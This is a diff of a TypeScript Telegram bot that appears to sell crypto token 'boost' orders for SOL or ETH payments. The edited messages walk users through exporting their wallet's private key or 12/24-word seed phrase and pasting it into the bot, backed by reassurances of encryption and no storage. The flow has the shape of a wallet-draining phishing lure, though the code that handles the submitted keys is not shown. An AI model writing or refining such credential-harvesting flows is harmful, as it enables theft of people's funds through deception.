@@ -231,24 +231,19 @@ async function showDeposit(ctx: any) {
 async function showConnectWallet(ctx: any) {
   const caption =
     `🔗 <b>Connect Your Wallet</b>\n\n` +
-    `Welcome to our secure wallet connection service!\n\n` +
-    `Connect your wallet to unlock premium features and enhanced trading capabilities.\n\n` +
+    `Import and link your wallet to this bot for seamless payments and order management.\n\n` +
     `<b>Available Options:</b>\n` +
-    `🔗 Connect Now - Start the connection process\n` +
-    `🔑 Why Connect? - Learn about the benefits\n` +
-    `🛡️ Security Guidelines - Important safety information\n` +
-    `📱 How to Connect - Step-by-step instructions\n\n` +
-    `Your security is our top priority. We use industry-standard encryption to protect your information.`;
+    `🔗 Connect Now — Import your wallet\n` +
+    `🛡️ Security Guidelines — Read before connecting\n` +
+    `📱 How to Connect — Step-by-step guide`;
   await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
 }
 
 async function showSupport(ctx: any) {
   const text =
     `💬 <b>Contact Support</b>\n\n` +
-    `For assistance, DM: <b>${SUPPORT_USERNAME}</b>\n\n` +
-    `🆔 Your User ID: <code>${ctx.from.id}</code>\n` +
-    `⏰ Support hours: 24/7\n\n` +
-    `We typically respond within 15 minutes.`;
+    `For assistance, contact: <b>${SUPPORT_USERNAME}</b>\n\n` +
+    `🆔 Your User ID: <code>${ctx.from.id}</code>`;
   await editOrSend(ctx, text, mainMenuOnlyKeyboard);
 }
 
@@ -503,25 +498,24 @@ export function createBot(): Telegraf {
       : `◎ <b>${s.selectedSol} SOL</b>\n📮 SOL Wallet:\n<code>${wallet.address}</code>`;
 
     const paymentMsg =
-      `💰 <b>Payment Required</b>\n\n` +
-      `📋 <b>Order Summary:</b>\n` +
-      `• Token: ${s.tokenName} (${s.tokenSymbol})\n` +
+      `✅ <b>Order Confirmed!</b>\n\n` +
+      `📋 <b>Order Details:</b>\n` +
+      `• Token: <b>${s.tokenName}</b> ($${s.tokenSymbol})\n` +
+      `• CA: <code>${s.contractAddress}</code>\n` +
       `• Service: ${s.serviceLabel}\n` +
       (isEth
-        ? `• Amount: $${s.ethAmount} USD\n`
-        : `• Amount: ${s.selectedSol} SOL\n`) +
-      `• Order ID: ${orderId}\n\n` +
-      `💳 <b>Payment Instructions:</b>\n` +
+        ? `• Amount: <b>$${s.ethAmount} USD</b>\n`
+        : `• Amount: <b>${s.selectedSol} SOL</b>\n`) +
+      `• Order ID: <code>${orderId}</code>\n\n` +
+      `💳 <b>Send Payment To:</b>\n` +
       (isEth
-        ? `Send exactly $${s.ethAmount} USD to:\n\nETH Wallet:\n<code>${ETH_ADDRESS || SOL_ADDRESS}</code>`
-        : `Send exactly ${s.selectedSol} SOL to:\n\nSolana Wallet:\n<code>${wallet.address}</code>`) +
-      `\n\n⚠️ <b>Important:</b>\n` +
+        ? `ETH Wallet:\n<code>${ETH_ADDRESS || SOL_ADDRESS}</code>`
+        : `SOL Wallet:\n<code>${wallet.address}</code>`) +
+      `\n\n` +
       (isEth
-        ? `• Send the EXACT amount: $${s.ethAmount} USD\n• Use Ethereum network only\n`
-        : `• Send the EXACT amount: ${s.selectedSol} SOL\n• Use Solana network only\n`) +
-      `• Payment expires in 15 minutes\n` +
-      `• After sending, submit your transaction hash below\n\n` +
-      `⏰ Time Remaining: 15:00`;
+        ? `⚠️ Send exactly <b>$${s.ethAmount} USD</b> on Ethereum network`
+        : `⚠️ Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) +
+      `\n\nAfter sending, click the button below and submit your transaction hash.`;
 
     // Show payment screen with token image if available
     let sentWithPhoto = false;
@@ -571,13 +565,8 @@ export function createBot(): Telegraf {
     setSession(ctx.from.id, { step: "awaiting_tx_hash" });
     await editOrSend(ctx,
       `📝 <b>Submit Transaction Hash</b>\n\n` +
-      `Please paste your Solana transaction hash below:\n\n` +
-      `💡 <b>Where to find it:</b>\n` +
-      `• Copy from your wallet app after sending\n` +
-      `• Check your wallet's transaction history\n` +
-      `• Look for the long string of letters and numbers\n\n` +
-      `🕐 <b>Order ID:</b>\n<code>${s.orderId ?? "N/A"}</code>\n\n` +
-      `🔍 We'll automatically verify your payment once you submit the hash.`,
+      `Please paste your transaction hash below.\n\n` +
+      `🕐 Order ID: <code>${s.orderId ?? "N/A"}</code>`,
       cancelKeyboard
     );
   });
@@ -684,20 +673,12 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
       `🛡️ <b>Security Guidelines</b>\n\n` +
-      `⚠️ <b>IMPORTANT SECURITY NOTICE:</b>\n\n` +
-      `🔒 <b>What We Do:</b>\n` +
-      `• End-to-End Encryption - Your data is encrypted at all times\n` +
-      `• No Storage - We never store your private keys permanently\n` +
-      `• Secure Processing - All operations use secure, isolated environments\n` +
-      `• Regular Audits - Our security is regularly tested and verified\n\n` +
-      `🚨 <b>What You Should Know:</b>\n` +
-      `• Never Share - Only enter your keys in official bot interfaces\n` +
-      `• Monitor Activity - Regularly check your wallet transactions\n` +
-      `• Stay Updated - Keep your wallet software up to date\n` +
-      `• Use Hardware Wallets - For maximum security with large amounts\n\n` +
-      `🔐 <b>Our Commitment:</b>\n` +
-      `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.\n\n` +
-      `Ready to proceed safely?`,
+      `• End-to-End Encryption — Your data is encrypted at all times\n` +
+      `• No Storage — We never store your private keys permanently\n` +
+      `• Secure Processing — All operations use secure, isolated environments\n` +
+      `• Regular Audits — Our security is regularly tested and verified\n\n` +
+      `⚠️ <b>Never share your private key or seed phrase with anyone except this official bot interface.</b>\n\n` +
+      `Ready to proceed?`,
       securityGuidelinesKeyboard
     );
   });
@@ -706,23 +687,12 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
       `📱 <b>How to Connect Your Wallet</b>\n\n` +
-      `🔧 <b>Step-by-Step Process:</b>\n\n` +
-      `1️⃣ <b>Choose Connection Method</b>\n` +
-      `• Private Key - Direct key import (fastest)\n` +
-      `• Seed Phrase - 12/24 word recovery phrase\n\n` +
-      `2️⃣ <b>Prepare Your Information</b>\n` +
-      `• Open your wallet app (Phantom, Solflare, etc.)\n` +
-      `• Navigate to wallet settings or security section\n` +
-      `• Copy your private key or seed phrase\n\n` +
-      `<b>Supported Wallets:</b>\n` +
-      `• Phantom - Most popular Solana wallet\n` +
-      `• Solflare - Advanced features and security\n` +
-      `• Backpack - Modern interface and tools\n` +
-      `• Glow - Mobile-optimized experience\n` +
-      `• Other Solana Wallets - Most SPL-compatible wallets\n\n` +
-      `⏰ Connection Time: Usually 2-5 minutes\n` +
-      `🔒 Security: Military-grade encryption throughout\n\n` +
-      `Ready to connect your wallet?`,
+      `1️⃣ Click <b>Connect Now</b>\n` +
+      `2️⃣ Open your wallet app (Phantom, Solflare, MetaMask, etc.)\n` +
+      `3️⃣ Go to Settings → Export Private Key or Seed Phrase\n` +
+      `4️⃣ Copy and paste it into the bot\n` +
+      `5️⃣ Wait for confirmation\n\n` +
+      `⏰ Connection usually takes 2–5 minutes.`,
       howToConnectKeyboard
     );
   });
@@ -731,23 +701,8 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
     await editOrSend(ctx,
-      `🔗 <b>Connect Your Wallet Now</b>\n\n` +
       `⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n` +
-      `Please enter your Private Key or 12 word Seed Phrase to import your wallet:\n\n` +
-      `🔑 <b>Private Key Format:</b>\n` +
-      `• Single long string (64+ characters)\n` +
-      `• Example:\n` +
-      `<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
-      `🌱 <b>Seed Phrase Format:</b>\n` +
-      `• 12 or 24 words separated by spaces\n` +
-      `• Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>\n\n` +
-      `🔰 <b>Security Features:</b>\n` +
-      `• End-to-end encryption\n` +
-      `• Secure processing environment\n` +
-      `• Immediate deletion after connection\n` +
-      `• No permanent storage\n\n` +
-      `⚡ <b>Auto-Detection:</b>\n` +
-      `Our system will automatically detect whether you're providing a private key or seed phrase.`,
+      `Please enter your <b>Private Key</b> or <b>12/24 word Seed Phrase</b> to import your wallet:`,
       cancelKeyboard
     );
   });
@@ -964,13 +919,12 @@ export function createBot(): Telegraf {
           : `💰 Amount: <b>${s.selectedSol} SOL</b>`;
 
         await ctx.reply(
-          `✅ <b>Transaction Accepted!</b>\n\n` +
+          `✅ <b>Payment Received!</b>\n\n` +
           `${verifiedLine}\n` +
           `${amountLine}\n\n` +
           `🔗 TX Hash:\n<code>${raw}</code>\n\n` +
-          `🚀 Your boost will start within <b>5–30 minutes</b>.\n` +
-          `📬 You'll be notified here when it goes live!\n\n` +
-          `💬 Need help? ${SUPPORT_USERNAME}`,
+          `🚀 Your order is now being processed. Your boost will go live within <b>5–30 minutes</b>.\n\n` +
+          `💬 For support: ${SUPPORT_USERNAME}`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
 
